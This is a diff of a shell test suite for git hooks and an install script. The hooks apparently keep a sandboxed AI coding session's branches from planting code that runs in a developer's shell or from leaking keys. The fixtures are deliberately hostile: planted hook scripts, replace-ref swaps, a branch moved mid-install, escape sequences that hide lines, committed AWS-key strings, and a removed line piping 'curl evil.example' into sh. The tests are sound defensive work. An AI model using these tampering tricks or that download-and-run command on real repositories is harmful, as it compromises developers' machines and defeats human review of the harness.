-(cd "$o" && python3 -I "$here/review_pass.py" check HEAD >/dev/null) || fail "records.sh and review_pass.py print a tree differently"
-echo log >>"$o/docs/review-log.md" && git -C "$o" add docs && git -C "$o" commit -qm log && head=$(git -C "$o" rev-parse HEAD)
-push main || fail "pre-push outside the sandbox refused main once its review log was written"
-base=$head
-echo x >"$o/scripts/tool.sh"
-git -C "$o" add scripts
-git -C "$o" commit -qm tool
-head=$(git -C "$o" rev-parse HEAD)
-mark "$head" full
-push slice-1a || fail "pre-push outside the sandbox refused a branch its full gate passed"
-push main && fail "pre-push outside the sandbox took main whose review pass is for other code"
-pass
-push main "$base" && fail "pre-push outside the sandbox took an undeclared harness change"
-push main 1111111111111111111111111111111111111111 && fail "pre-push outside the sandbox took a main it cannot compare"
-git -C "$o" commit -q --allow-empty -m declare -m "Harness-changed: scripts/tool.sh - a test" && head=$(git -C "$o" rev-parse HEAD)
-push main "$base" || fail "pre-push outside the sandbox refused main with its harness change declared"
-printf 'aws = "%s"\n' "$key" >"$o/leak.py" && git -C "$o" add leak.py && git -C "$o" commit -qm leak && head=$(git -C "$o" rev-parse HEAD) && mark "$head" full && pass
-push main && fail "pre-push outside the sandbox let main through with a key in its history"
+push slice-1a || fail "pre-push outside the sandbox refused a branch with no secret"
+push main && fail "pre-push outside the sandbox let main through (D13165)"
+printf 'aws = "%s"\n' "$key" >"$o/leak.py" && git -C "$o" add leak.py && git -C "$o" commit -qm leak && head=$(git -C "$o" rev-parse HEAD)
 push slice-1a && fail "pre-push outside the sandbox let a branch through with a key in its history"
 untouched pre-push
-# A merge of a branch onto the main it left gives the branch's code, which its gate recorded.
-git -C "$o" checkout -q -b feature
-echo four >>"$o/a.ts"
-git -C "$o" commit -qam four
-git -C "$o" checkout -q -
-git -C "$o" merge -q --no-ff --no-commit feature >/dev/null 2>&1 || :
-out sh .githooks/pre-merge-commit && fail "pre-merge-commit outside the sandbox took a merge no gate passed"
-mark feature full
-out sh .githooks/pre-merge-commit || fail "pre-merge-commit outside the sandbox refused a merge of a branch its gate passed"
-git -C "$o" merge --abort
-untouched pre-merge-commit
-# A print is recorded once, however often its gate passes.
-p=$(cd "$o" && . .githooks/records.sh && code_print HEAD)
-(cd "$o" && . .githooks/records.sh && put "$p" once && put "$p" once) || fail "records.sh could not record a print"
-[ "$(wc -l <"$o/.claude/tmp/green-once")" -eq 1 ] || fail "records.sh recorded the same print twice"
-# A longer line that holds the print is no record of it: the print is still written, whole.
-printf '%sx\n' "$p" >"$o/.claude/tmp/green-near"
-(cd "$o" && . .githooks/records.sh && put "$p" near)
-grep -qxF "$p" "$o/.claude/tmp/green-near" || fail "records.sh took a longer line for the print it records"
-# The gate records the code it tested: the working tree's, prose aside and untracked files in,
-# and nothing when that code changed while it ran (F133).
-wt() { (cd "$o" && . .githooks/records.sh && worktree_print); }
-[ "$(wt)" = "$p" ] || fail "records.sh printed a clean working tree unlike its HEAD"
-echo prose >"$o/docs/w.md"
-[ "$(wt)" = "$p" ] || fail "records.sh counted an untracked doc as code"
-echo code >"$o/w.ts"
-tested=$(wt)
-[ "$tested" != "$p" ] || fail "records.sh left an untracked code file out"
-echo more >>"$o/w.ts"
-(cd "$o" && . .githooks/records.sh && gate_passed "$tested" true 2>/dev/null)
-grep -qxF "$tested" "$o/.claude/tmp/green-fast" && fail "records.sh recorded code that changed while its gate ran (F133)"
-tested=$(wt)
-(cd "$o" && . .githooks/records.sh && gate_passed "$tested" true)
-grep -qxF "$tested" "$o/.claude/tmp/green-full" && grep -qxF "$tested" "$o/.claude/tmp/green-fast" || fail "records.sh did not record a full gate's code in both records"
-rm "$o/w.ts" "$o/docs/w.md"
-(cd "$o" && . .githooks/records.sh && f=kept && p=kept && { green HEAD fast || :; } && [ "$f$p" = keptkept ]) || fail "records.sh left a variable set in the shell that sources it (F133)"
-# A prose name with an accent stays prose, as code_changed.sh reads it (F133).
-mark HEAD fast
-mkdir -p "$o/adr" && echo prose >"$o/docs/café.md" && echo prose >"$o/adr/décision.md"
-git -C "$o" add docs adr && git -C "$o" commit -qm accents
-(cd "$o" && . .githooks/records.sh && green HEAD fast) || fail "records.sh took an accented doc for code (F133)"
-# A code_changed.sh that fails, missing or broken, is no proof of prose alone (F133).
-echo again >>"$o/a.ts" && git -C "$o" add a.ts
-printf 'exit 2\n' >"$o/.githooks/code_changed.sh"
-out sh .githooks/pre-commit && fail "pre-commit outside the sandbox took a failing code_changed.sh for prose alone (F133)"
-rm "$o/.githooks/code_changed.sh"
-out sh .githooks/pre-commit && fail "pre-commit outside the sandbox took a missing code_changed.sh for prose alone (F133)"
-git -C "$o" checkout -q HEAD -- .githooks/code_changed.sh a.ts
-untouched records
 fi
 
 if part installed; then
 # The hooks live in .git/hooks, where no merge, checkout or sandboxed command writes, installed
 # from main with the scripts they run: no branch brings its own into Alexis's shell (F129).
 i="$t/installed"
-mkdir -p "$i/scripts" "$i/.githooks" "$i/.claude/tmp" "$i/docs"
+mkdir -p "$i/scripts" "$i/.githooks" "$i/docs"
 cp "$hooks"/* "$i/.githooks/"
-cp "$here/code_changed.sh" "$here/install_hooks.sh" "$i/scripts/"
+cp "$here/install_hooks.sh" "$i/scripts/"
 secrets_into "$i/scripts/"
-printf '.claude/tmp\nran\n' >"$i/.gitignore"
+printf 'ran\n' >"$i/.gitignore"
 echo one >"$i/a.ts"
 git -C "$i" init -q -b main
 git -C "$i" add -A
@@ -2983,43 +2830,30 @@ git -C "$i" commit -qm base
 base=$(git -C "$i" rev-parse HEAD)
 plant() { printf '#!/bin/sh\n: >"%s/ran"\n' "$i" >"$i/$1"; } # it leaves a mark when it runs
 # Branches made before any hook is installed, so none runs at their commits:
-# - planted: code where the hooks and their scripts are, a rule file that finds nothing, and a
-#   script holding a NUL byte and an escape sequence, which a display could hide;
-# - tweak: a hook changed and declared; settings: Claude Code's settings changed;
-# - feature: code only; shadow: a script in the hooks folder named as one they run;
+# - planted: code where the hooks and their scripts are, and a rule file that finds nothing;
+# - tweak: a hook changed; feature: code only; leaky: a key (kept off every ref till its merge's case, as pre-push scans them
+#   all); shadow: a script in the hooks folder named as one they run;
 # - no-<hook>: one hook missing.
 git -C "$i" checkout -q -b planted
-for f in .githooks/pre-commit .githooks/pre-merge-commit .githooks/commit-msg .githooks/records.sh .githooks/merge.sh \
-	scripts/scan_secrets.sh scripts/code_changed.sh scripts/install_hooks.sh; do
+for f in .githooks/pre-commit .githooks/pre-merge-commit .githooks/commit-msg .githooks/records.sh scripts/scan_secrets.sh scripts/install_hooks.sh; do
 	plant "$f"
 done
 printf 'title = "finds nothing"\n' >"$i/scripts/gitleaks.toml"
-printf 'echo hidden\0\n\033[1A\033[2Kecho covered\n' >"$i/scripts/nul.sh"
 git -C "$i" add -A
 git -C "$i" commit -qm plant
 git -C "$i" checkout -q -b tweak main
 echo '# a comment' >>"$i/.githooks/pre-push"
-git -C "$i" commit -qam tweak -m "Harness-changed: .githooks/pre-push - a test"
-git -C "$i" checkout -q -b settings main
-echo '{}' >"$i/.claude/settings.json"
-git -C "$i" add .claude/settings.json
-git -C "$i" commit -qm settings
+git -C "$i" commit -qam tweak
 git -C "$i" checkout -q -b feature main
 echo two >>"$i/a.ts"
 git -C "$i" commit -qam feature
-# cased: harness files spelled with capitals, which a case-blind disk takes for the real ones.
-git -C "$i" checkout -q -b cased main
-blob=$(echo 'echo planted' | git -C "$i" hash-object -w --stdin)
-git -C "$i" update-index --add --cacheinfo "100644,$blob,Scripts/guard.py"
-git -C "$i" update-index --add --cacheinfo "100644,$blob,.Claude/settings.json"
-git -C "$i" commit -qm cased
-git -C "$i" checkout -q -f main
-# folded: a path whose letter this disk folds beyond ASCII (ſ is s there), unknown to git (F164).
-git -C "$i" checkout -q -b folded main
-git -C "$i" update-index --add --cacheinfo "100644,$blob,packageſ/evil/package.json"
-git -C "$i" commit -qm folded
-git -C "$i" checkout -q -f main
+git -C "$i" checkout -q -b leaky main
+printf 'aws = "%s"\n' "$key" >"$i/leak.py"
+git -C "$i" add leak.py
+git -C "$i" commit -qm leak
+leaky=$(git -C "$i" rev-parse HEAD)
 git -C "$i" checkout -q -b shadow main
+git -C "$i" branch -D -q leaky
 plant .githooks/scan_secrets.sh
 git -C "$i" add .githooks
 git -C "$i" commit -qm shadow
@@ -3028,85 +2862,24 @@ for h in $hook_names; do
 	git -C "$i" rm -q ".githooks/$h"
 	git -C "$i" commit -qm "no $h"
 done
-# Merges that stop on a conflict (9n), each branch merged onto the first of its pair with merge.sh's mark:
-# - ledger-main, ledger: a ledger both change, every merge's case; ledger also changes the harness file merge.sh shows,
-#   with a line that looks like a conflict's marker;
-# - clash-main, clash: a harness file both change; gone: that file deleted, against ledger's change and clash-main's;
-# - twin-main-<n>, twin-branch-<n>: a harness file both add, named with a capital, matched by a glob, or starting with -;
-git -C "$i" checkout -q -b ledger-main main
-mkdir -p "$i/docs"
-echo main >"$i/docs/decisions.md"
-{ sed -n 1p "$i/.githooks/pre-push" && echo '# main, at the top' && sed 1d "$i/.githooks/pre-push"; } >"$t/pre-push"
-cat "$t/pre-push" >"$i/.githooks/pre-push"
-git -C "$i" add docs/decisions.md .githooks/pre-push
-git -C "$i" commit -qm ledger-main
-git -C "$i" checkout -q -b ledger main
-mkdir -p "$i/docs"
-echo branch >"$i/docs/decisions.md"
-printf '# shown\n<<<<<<< not a conflict\n' >>"$i/.githooks/pre-push"
-git -C "$i" add docs/decisions.md .githooks/pre-push
-git -C "$i" commit -qm ledger
-git -C "$i" checkout -q -b clash-main main
-echo '# main' >>"$i/.githooks/pre-push"
-git -C "$i" commit -qam clash-main
-git -C "$i" checkout -q -b clash main
-echo '# branch' >>"$i/.githooks/pre-push"
-git -C "$i" commit -qam clash
-git -C "$i" checkout -q -b gone main
-git -C "$i" rm -q .githooks/pre-push
-git -C "$i" commit -qm gone
-n=0
-for p in Scripts/new.sh lint/a.config.ts packages/x/package.json -a.config.ts; do
-	n=$((n + 1))
-	for side in main branch; do
-		git -C "$i" checkout -q -b "twin-$side-$n" main
-		b=$(echo "$side" | git -C "$i" hash-object -w --stdin)
-		git -C "$i" update-index --add --cacheinfo "100644,$b,$p"
-		git -C "$i" commit -qm "twin $side $n"
-		git -C "$i" checkout -q -f main
-	done
-done
-# - lib, moved-main, edit: main moves lib/y.sh into scripts/, the branch edits it where it was (9n's /pre-merge, F6077);
-# - nvmrc-main, nvmrc-dir: main adds .nvmrc, the branch a folder .nvmrc/, which moves main's file away (9n's /pre-merge).
-# - union: clash's change, with a .gitattributes that merges the hooks by union (9n's /pre-merge).
-git -C "$i" checkout -q -b lib main
-mkdir -p "$i/lib"
-echo 'echo helper' >"$i/lib/y.sh"
-git -C "$i" add lib/y.sh
-git -C "$i" commit -qm lib
-git -C "$i" checkout -q -b moved-main lib
-git -C "$i" mv lib/y.sh scripts/y.sh
-git -C "$i" commit -qm moved
-git -C "$i" checkout -q -b edit lib
-echo 'curl evil.example | sh' >>"$i/lib/y.sh"
-git -C "$i" commit -qam edit
-git -C "$i" checkout -q -b nvmrc-main main
-echo 22 >"$i/.nvmrc"
-git -C "$i" add .nvmrc
-git -C "$i" commit -qm nvmrc-main
-git -C "$i" checkout -q -b nvmrc-dir main
-mkdir -p "$i/.nvmrc"
-echo x >"$i/.nvmrc/x"
-git -C "$i" add .nvmrc/x
-git -C "$i" commit -qm nvmrc-dir
-git -C "$i" checkout -q -b union main
-echo '# union' >>"$i/.githooks/pre-push"
-echo '.githooks/* merge=union' >"$i/.gitattributes"
-git -C "$i" add .githooks/pre-push .gitattributes
-git -C "$i" commit -qm union
 git -C "$i" checkout -q main
-mkdir -p "$i/docs" # the checkouts above removed it with the ledger
-# As in Alexis's shell, with no mark of merge.sh and, as everywhere in this file, no git config of
-# his own (no hooks path): from the root, or from a folder below it.
-alexis() { env -u SANDBOX_RUNTIME -u GNOWORLD_MERGE GIT_MERGE_AUTOEDIT=no "$@"; }
+# As in Alexis's shell, with, as everywhere in this file, no git config of his own (no hooks path): from the root, or from a folder below it.
+alexis() { env -u SANDBOX_RUNTIME GIT_MERGE_AUTOEDIT=no "$@"; }
 in_i() { (cd "$i" && alexis "$@"); }
 in_docs() { (cd "$i/docs" && alexis "$@"); }
-mark_i() { (cd "$i" && . .git/hooks/records.sh && p=$(code_print "$1") && put "$p" "$2" && if [ "$2" = full ]; then put "$p" fast; fi); }
 ran() { [ ! -e "$i/ran" ] || fail "$1 ran code a branch planted in the hooks or their scripts (F129)"; }
-installed() { in_i sh .git/hooks/install_hooks.sh --check "${1:-main}" >/dev/null 2>&1; }
+# What install_hooks.sh installs from a commit, $1 (main by default): .git/hooks holds each file, the commit's own bytes, a real file,
+# executable, and nothing else but git's samples.
+listed() { git -C "$i" ls-tree --full-tree -r --name-only "${1:-main}" -- .githooks scripts/scan_secrets.sh scripts/gitleaks.toml scripts/gitleaks-private.toml scripts/.gitleaksignore; }
+installed() {
+	for f in $(listed "$@"); do
+		to="$i/.git/hooks/${f##*/}"
+		[ ! -L "$to" ] && [ -x "$to" ] && git -C "$i" --no-replace-objects show "${1:-main}:$f" | cmp -s - "$to" || return 1
+	done
+	[ -z "$(ls -A "$i/.git/hooks" | grep -v '\.sample$' | grep -vxF "$(listed "$@" | sed 's|.*/||')")" ]
+}
 install() { in_i sh scripts/install_hooks.sh "$@" >/dev/null 2>&1; }
 reinstall() { install && installed || fail "install_hooks.sh did not put main's hooks back"; }
-untouched_main() { [ "$(git -C "$i" rev-parse HEAD)" = "$1" ] && [ ! -e "$i/.git/MERGE_HEAD" ]; }
 # Alexis's own command, from a branch other than main and a folder below the root: main's hooks
 # and scripts land in .git/hooks, executable, and git is taken off the repository's hooks, as
 # prepare had pointed it, however many times; merges stop fast-forwarding, which runs no hook.
@@ -3116,10 +2889,8 @@ git -C "$i" checkout -q tweak
 in_docs sh -c 'git --no-replace-objects show main:scripts/install_hooks.sh | sh' >/dev/null 2>&1 || fail "Alexis's install command failed"
 git -C "$i" checkout -q main
 [ "$(git -C "$i" rev-parse --git-path hooks)" = .git/hooks ] || fail "install_hooks.sh left git running the repository's hooks (F129)"
-for f in $(git -C "$i" ls-tree -r --name-only main -- .githooks scripts/install_hooks.sh scripts/scan_secrets.sh scripts/code_changed.sh \
-	scripts/gitleaks.toml scripts/gitleaks-private.toml scripts/.gitleaksignore); do
-	git -C "$i" show "main:$f" | cmp -s - "$i/.git/hooks/${f##*/}" || fail "install_hooks.sh did not install main's $f"
-done
+installed || fail "install_hooks.sh did not install main's hooks and the scripts they run, alone"
+installed tweak && fail "the hooks installed are another commit's than main's"
 for f in $hook_names; do [ -x "$i/.git/hooks/$f" ] || fail "install_hooks.sh left $f not executable, which git skips"; done
 [ "$(git -C "$i" config merge.ff)" = false ] || fail "install_hooks.sh left merges free to fast-forward, which runs no hook (F129)"
 [ "$(git -C "$i" config pull.ff)" = only ] || fail "install_hooks.sh left a pull free to make a merge commit"
@@ -3134,36 +2905,17 @@ installed || fail "install_hooks.sh did not fill a missing hooks folder"
 rm -r "$t/hooks-away"
 printf '[core]\n\thooksPath = /elsewhere\n' >"$t/global-config"
 in_i env GIT_CONFIG_GLOBAL="$t/global-config" sh scripts/install_hooks.sh >/dev/null 2>&1 && fail "install_hooks.sh passed with git's hooks still taken from elsewhere"
-# --check: .git/hooks holds exactly a commit's files, real files, the hooks executable, nothing
-# else that could run; it changes nothing.
-installed || fail "install_hooks.sh --check refused the hooks it installed"
-installed tweak && fail "install_hooks.sh --check took the hooks of another commit"
-git -C "$i" config merge.ff true
-installed && fail "install_hooks.sh --check took fast-forward merges back on, which run no hook (F159)"
-git -C "$i" config merge.ff false
+# The install puts back what changed there, and removes what main does not hold: a hook git would run, prepare-commit-msg too,
+# whose name holds commit-msg's; a file left from an older install (merge.sh, D13173).
 echo '# changed' >>"$i/.git/hooks/scan_secrets.sh"
-installed && fail "install_hooks.sh --check took a changed scan_secrets.sh"
-grep -q '# changed' "$i/.git/hooks/scan_secrets.sh" || fail "install_hooks.sh --check rewrote what it checks"
-reinstall
 rm "$i/.git/hooks/gitleaks-private.toml"
-installed && fail "install_hooks.sh --check took a missing rule file"
-reinstall
 chmod a-x "$i/.git/hooks/pre-commit"
-installed && fail "install_hooks.sh --check took a hook git would skip, not executable"
-reinstall
-ln -sf ../../.githooks/pre-commit "$i/.git/hooks/pre-commit"
-installed && fail "install_hooks.sh --check took a link into the working tree, which a checkout changes"
-reinstall
 plant .git/hooks/post-checkout
-chmod +x "$i/.git/hooks/post-checkout"
-installed && fail "install_hooks.sh --check took a hook main does not hold"
-reinstall
-[ ! -e "$i/.git/hooks/post-checkout" ] || fail "install_hooks.sh left a hook main does not hold"
 plant .git/hooks/prepare-commit-msg
-chmod +x "$i/.git/hooks/prepare-commit-msg"
-installed && fail "install_hooks.sh --check took prepare-commit-msg for commit-msg, a name inside it"
+plant .git/hooks/merge.sh
+chmod +x "$i/.git/hooks/post-checkout" "$i/.git/hooks/prepare-commit-msg"
 reinstall
-[ ! -e "$i/.git/hooks/prepare-commit-msg" ] || fail "install_hooks.sh left prepare-commit-msg, which git runs at every commit"
+for f in post-checkout prepare-commit-msg merge.sh; do [ ! -e "$i/.git/hooks/$f" ] || fail "install_hooks.sh left $f, which main does not hold"; done
 # The install writes in place of a link, not through it into the working tree.
 git -C "$i" checkout -q tweak
 ln -sf ../../.githooks/pre-push "$i/.git/hooks/pre-push"
@@ -3171,446 +2923,73 @@ install
 [ ! -L "$i/.git/hooks/pre-push" ] || fail "install_hooks.sh left a link for a hook"
 git -C "$i" diff --quiet || fail "install_hooks.sh wrote through a link into the working tree"
 git -C "$i" checkout -q main
-# A commit with no hooks, or no pre-commit, or two files under one name: refused, and nothing
-# installed changes.
+reinstall
+# A commit with no hooks, or one hook missing, or two files under one name: refused, and nothing installed changes.
 empty=$(git -C "$i" hash-object -w -t tree /dev/null)
-installed "$empty" && fail "install_hooks.sh --check took a commit that holds no hooks"
+install "$empty" && fail "install_hooks.sh installed from a tree that holds no hooks"
 for h in $hook_names; do
 	install "no-$h" && fail "install_hooks.sh installed hooks with no $h, so git would check nothing there"
 done
 install shadow && fail "install_hooks.sh installed two files under one name"
 installed || fail "install_hooks.sh changed the hooks before refusing a commit"
-# A replace ref makes git show other bytes for an object: the install, its check and Alexis's
-# command read the objects themselves (F132's class).
+# The commit is read once: a branch moved while the install runs (a session can move a work branch's ref) changes nothing it writes
+# (the security review of 3b, L3). A git that moves tweak to planted at the install's first `show`.
+real_git=$(command -v git) && mkdir -p "$t/moving"
+printf '#!/bin/sh\n[ "$1" != show ] || [ -e "%s/moved" ] || { : >"%s/moved"; "%s" branch -f tweak planted; }\nexec "%s" "$@"\n' "$t" "$t" "$real_git" "$real_git" >"$t/moving/git"
+chmod +x "$t/moving/git"
+tweaked=$(git -C "$i" rev-parse tweak)
+in_i env PATH="$t/moving:$PATH" sh scripts/install_hooks.sh tweak >/dev/null 2>&1 || fail "install_hooks.sh failed when its branch moved"
+[ -e "$t/moved" ] && [ "$(git -C "$i" rev-parse tweak)" = "$(git -C "$i" rev-parse planted)" ] || fail "the moving git moved nothing: the case proves nothing"
+installed "$tweaked" || fail "install_hooks.sh installed from a branch moved while it ran, not the commit it was given (L3)"
+ran "install_hooks.sh, its branch moved"
+git -C "$i" branch -f tweak "$tweaked"
+reinstall
+# A replace ref makes git show other bytes for an object: the install and Alexis's command read the objects themselves (F132's class).
 evil=$(printf '#!/bin/sh\n: >"%s/ran"\n' "$i" | git -C "$i" hash-object -w --stdin)
 for f in .githooks/pre-commit scripts/install_hooks.sh; do git -C "$i" replace "$(git -C "$i" rev-parse "main:$f")" "$evil"; done
 install
 git -C "$i" --no-replace-objects show main:.githooks/pre-commit | cmp -s - "$i/.git/hooks/pre-commit" || fail "install_hooks.sh installed what a replace ref shows (F132)"
 git -C "$i" cat-file -p "$evil" >"$i/.git/hooks/pre-commit"
-installed && fail "install_hooks.sh --check took what a replace ref shows for the commit (F132)"
 in_docs sh -c 'git --no-replace-objects show main:scripts/install_hooks.sh | sh' >/dev/null 2>&1 || fail "Alexis's install command failed beside a replace ref"
 git -C "$i" replace -d $(git -C "$i" replace -l) >/dev/null
 installed || fail "Alexis's install command installed what a replace ref shows (F132)"
 ran "install_hooks.sh"
-# merge.sh merges no code its gate did not pass, then shows each harness file a branch changes,
-# with its diff as text and its control bytes visible, and merges once the name is typed, from
-# any folder of the repository.
-echo planted | in_i sh .git/hooks/merge.sh planted >"$t/out" 2>&1 && fail "merge.sh merged code no gate passed"
-grep -q '^merge\.sh: .*press Enter' "$t/out" && fail "merge.sh said to conclude a merge a hook refused, with no conflict (9n)"
-git -C "$i" merge --abort
-mark_i planted fast
-# A replace ref would show an innocent script where the branch holds a planted one.
-innocent=$(echo 'echo innocent' | git -C "$i" hash-object -w --stdin)
-git -C "$i" replace "$(git -C "$i" rev-parse planted:scripts/scan_secrets.sh)" "$innocent"
-for answer in wrong '*' '' plante; do
-	printf '%s\n' "$answer" | in_docs sh ../.git/hooks/merge.sh planted >"$t/merged" 2>&1 && fail "merge.sh merged on the answer '$answer'"
-	untouched_main "$base" || fail "merge.sh began a merge on the answer '$answer'"
-done
-git -C "$i" replace -d $(git -C "$i" replace -l) >/dev/null
-in_i sh .git/hooks/merge.sh planted </dev/null >/dev/null 2>&1 && fail "merge.sh merged with no answer"
-for f in $(git -C "$i" diff --name-only main planted); do grep -qxF "$f" "$t/merged" || fail "merge.sh did not list $f"; done
-grep -q '^+: >' "$t/merged" || fail "merge.sh did not show the harness's diff"
-grep -q 'echo innocent' "$t/merged" && fail "merge.sh showed what a replace ref shows, not what merges (F132)"
-grep -q 'echo hidden' "$t/merged" || fail "merge.sh showed a file holding a NUL byte as binary (F132)"
-grep -q "$(printf '\033')" "$t/merged" && fail "merge.sh passed an escape sequence to the terminal, which can hide a line"
-# What Alexis's own git would show instead: an external diff, a text conversion, colours.
-printf '#!/bin/sh\necho NOTHING TO SEE\n' >"$t/fakediff"
-chmod +x "$t/fakediff"
-git -C "$i" config diff.external "$t/fakediff"
-git -C "$i" config diff.fake.textconv "$t/fakediff"
-echo '* diff=fake' >"$t/attributes"
-git -C "$i" config core.attributesFile "$t/attributes" # his own attributes: .git/info/attributes is refused (9n's /pre-merge)
-git -C "$i" config color.diff always
-echo wrong | in_i sh .git/hooks/merge.sh planted >"$t/merged" 2>&1 || :
-grep -q 'NOTHING TO SEE' "$t/merged" && fail "merge.sh showed a diff tool's rendering, not the text that merges (F156)"
-grep -q '^+: >' "$t/merged" || fail "merge.sh showed no text of the harness's diff beside a diff tool (F156)"
-grep -q '\^\[\[32m' "$t/merged" && fail "merge.sh showed colour codes, which can hide a line (F156)"
-git -C "$i" config --unset diff.external
-git -C "$i" config --unset diff.fake.textconv
-git -C "$i" config --unset color.diff
-git -C "$i" config --unset core.attributesFile
-# Capitals: on a case-blind disk, Scripts/guard.py is scripts/guard.py; merge.sh shows it (F151).
-mark_i cased fast
-echo wrong | in_i sh .git/hooks/merge.sh cased >"$t/cased" 2>&1 && fail "merge.sh merged harness files spelled with capitals unshown (F151)"
-grep -qx 'Scripts/guard.py' "$t/cased" && grep -qx '.Claude/settings.json' "$t/cased" || fail "merge.sh did not show harness files spelled with capitals (F151)"
-untouched_main "$base" || fail "merge.sh began a merge on a wrong answer"
-# Beyond ASCII, git cannot tell what the disk folds: a path holding such a letter is refused,
-# by merge.sh before it writes, and at the merge's commit (F164).
-mark_i folded fast
-echo folded | in_i sh .git/hooks/merge.sh folded >"$t/folded" 2>&1 && fail "merge.sh merged a path this disk may read as another (F164)"
-grep -q 'non-ASCII' "$t/folded" || fail "merge.sh refused the folded path for another reason than its name (F164)"
-untouched_main "$base" || fail "merge.sh began a merge of a path this disk may read as another"
-in_i git merge -q --no-ff folded >"$t/out" 2>&1 && fail "a merge took a path this disk may read as another (F164)"
-grep -q 'non-ASCII' "$t/out" && grep -q 'git reset --hard after a squash' "$t/out" || fail "pre-commit refused the folded path without saying why and how to undo it (F164)"
-git -C "$i" merge --abort
-# pre-push runs its own records and scan, not those of the branch it pushes.
+# The working tree of a branch that planted code where the hooks and their scripts are, and a rule file that finds nothing: the
+# hooks run their own, installed from main. pre-push sends the branch, scanned; a clean change passes; a key is refused by the scan.
 git -C "$i" checkout -q planted
 printf 'refs/heads/planted %s refs/heads/planted 0000000000000000000000000000000000000000\n' "$(git -C "$i" rev-parse HEAD)" |
-	in_i sh .git/hooks/pre-push origin url >/dev/null 2>&1 || fail "pre-push refused a branch its gate passed"
-git -C "$i" checkout -q main
+	in_i sh .git/hooks/pre-push origin url >/dev/null 2>&1 || fail "pre-push refused a branch with no secret"
 ran "pre-push"
-# merge.sh merges the commit it showed, even if the branch moves before the merge: a git that
-# moves it when merge.sh asks for the status, after it read the branch.
-shown=$(git -C "$i" rev-parse planted)
-real_git=$(command -v git)
-mkdir "$t/moving"
-printf '#!/bin/sh\n[ "$1" != status ] || "%s" branch -f planted feature\nexec "%s" "$@"\n' "$real_git" "$real_git" >"$t/moving/git"
-chmod +x "$t/moving/git"
-echo planted | (PATH="$t/moving:$PATH" in_i sh .git/hooks/merge.sh planted) >/dev/null 2>&1 || fail "merge.sh refused to merge on the branch's name"
-[ "$(git -C "$i" rev-parse HEAD^2)" = "$shown" ] || fail "merge.sh merged a commit other than the one it showed"
-git -C "$i" branch -f planted "$shown"
-ran "a merge"
-# The working tree now holds the planted scripts and a rule file that finds nothing; the hooks
-# scan with their own: a clean change passes, a key is refused by the scan.
 echo clean >"$i/clean.ts"
 git -C "$i" add clean.ts
-mark_i "$(git -C "$i" write-tree)" fast
-in_i sh .git/hooks/pre-commit >/dev/null 2>&1 || fail "pre-commit refused a clean change after the merge"
+in_i sh .git/hooks/pre-commit >/dev/null 2>&1 || fail "pre-commit refused a clean change beside planted scripts"
 printf 'aws = "%s"\n' "$key" >"$i/leak.py"
 git -C "$i" add leak.py
-mark_i "$(git -C "$i" write-tree)" fast
 in_i sh .git/hooks/pre-commit >"$t/out" 2>&1 && fail "pre-commit let a key through, with the working tree's rule file (F129)"
-grep -q 'leaks found' "$t/out" || fail "pre-commit refused the key for another reason than the scan's"
+grep -q 'leaks found: 1' "$t/out" || fail "pre-commit refused the key for another reason than the scan's"
 git -C "$i" rm -qf --cached leak.py clean.ts
 rm "$i/leak.py" "$i/clean.ts"
 printf 'fix: x\n' >"$t/installed-msg"
-in_i sh .git/hooks/commit-msg "$t/installed-msg" >/dev/null 2>&1 || fail "commit-msg refused a clean message after the merge"
+in_i sh .git/hooks/commit-msg "$t/installed-msg" >/dev/null 2>&1 || fail "commit-msg refused a clean message beside planted scripts"
 printf 'fix: x\n\naws = %s\n' "$key" >"$t/installed-msg"
 in_i sh .git/hooks/commit-msg "$t/installed-msg" >"$t/out" 2>&1 && fail "commit-msg let a key through, with the working tree's rule file (F129)"
 grep -q 'the message holds' "$t/out" || fail "commit-msg refused the key for another reason than the scan's"
 ran "pre-commit or commit-msg"
-# merge.sh merges onto the branch checked out, a part's as main (9n-3), never onto no branch, with nothing uncommitted,
-# staged or untracked, and starts nothing otherwise; with no harness change it asks for nothing.
-git -C "$i" reset -q --hard "$base"
-git -C "$i" checkout -q feature
-mark_i "$(git -C "$i" merge-tree --write-tree feature planted)" fast
-echo planted | in_i sh .git/hooks/merge.sh planted >"$t/out" 2>&1 || { cat "$t/out" >&2; fail "merge.sh refused to merge onto a part's branch (9n-3)"; }
-[ "$(git -C "$i" rev-parse HEAD^2)" = "$(git -C "$i" rev-parse planted)" ] && [ "$(git -C "$i" symbolic-ref --short HEAD)" = feature ] ||
-	fail "merge.sh did not merge onto the part's branch it was on (9n-3)"
-git -C "$i" reset -q --hard HEAD^1
-git -C "$i" checkout -q --detach main
-echo planted | in_i sh .git/hooks/merge.sh planted >/dev/null 2>&1 && fail "merge.sh merged onto no branch"
-untouched_main "$base" || fail "merge.sh began a merge onto no branch"
 git -C "$i" checkout -q main
-for dirt in 'echo dirty >>a.ts' 'echo staged >>a.ts && git add a.ts' 'echo new >new.ts'; do
-	(cd "$i" && sh -c "$dirt")
-	echo planted | in_i sh .git/hooks/merge.sh planted >/dev/null 2>&1 && fail "merge.sh merged onto: $dirt"
-	untouched_main "$base" || fail "merge.sh began a merge onto: $dirt"
-	git -C "$i" reset -q --hard
-	rm -f "$i/new.ts"
-done
-mark_i feature fast
-in_i sh .git/hooks/merge.sh feature </dev/null >"$t/out" 2>&1 || fail "merge.sh wanted a name for a merge with no harness change"
-grep -q '^merge\.sh: .*press Enter' "$t/out" && fail "merge.sh said to conclude a merge it made (9n)"
-[ "$(git -C "$i" rev-parse HEAD^2)" = "$(git -C "$i" rev-parse feature)" ] || fail "merge.sh did not merge a branch with no harness change"
+# A merge always makes a commit, fast-forwards being off, and pre-merge-commit scans it with main's rules: the planted branch merges,
+# its planted hooks and scripts running nowhere (the red pass, M8); a key a branch brings is refused, main left where it was; a
+# clean branch merges.
+in_i git merge -q planted >/dev/null 2>&1 || fail "the merge of the planted branch, with no secret, was refused"
+[ "$(git -C "$i" rev-parse HEAD^2)" = "$(git -C "$i" rev-parse planted)" ] || fail "the merge of the planted branch made no merge commit"
+ran "the merge of the planted branch"
 git -C "$i" reset -q --hard "$base"
-# A merge that did not come through merge.sh has written the harness unseen: its commit is
-# refused, whether git makes it or Alexis does after a conflict, and main does not
-# fast-forward past every hook. A merge with no harness change needs no merge.sh.
-in_i git merge -q planted >/dev/null 2>&1 && fail "a plain merge took harness changes merge.sh did not show (F129)"
-[ "$(git -C "$i" rev-parse HEAD)" = "$base" ] || fail "a plain merge fast-forwarded main past every hook (F129)"
-git -C "$i" merge --abort
-mark_i settings fast
